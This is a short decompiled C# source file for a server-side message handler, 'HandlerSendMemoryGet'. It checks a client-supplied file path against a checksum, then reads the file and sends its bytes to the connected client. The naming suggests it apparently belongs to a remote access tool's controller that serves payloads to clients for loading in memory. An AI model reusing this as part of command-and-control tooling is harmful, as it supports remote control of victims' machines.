using System;
using System.IO;
using Leb128;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x0200004C RID: 76
	internal class HandlerSendMemoryGet
	{
		// Token: 0x060001CE RID: 462 RVA: 0x0001CFF8 File Offset: 0x0001B1F8
		public static void Read(Clients client, object[] objects)
		{
			string text = (string)objects[1];
			if (Methods.GetChecksum(text) == (string)objects[2])
			{
				byte[] data = LEB128.Write(new object[]
				{
					"SendMemory",
					File.ReadAllBytes(text),
					Path.GetFileName(text)
				});
				client.Send(data);
			}
		}
	}
}
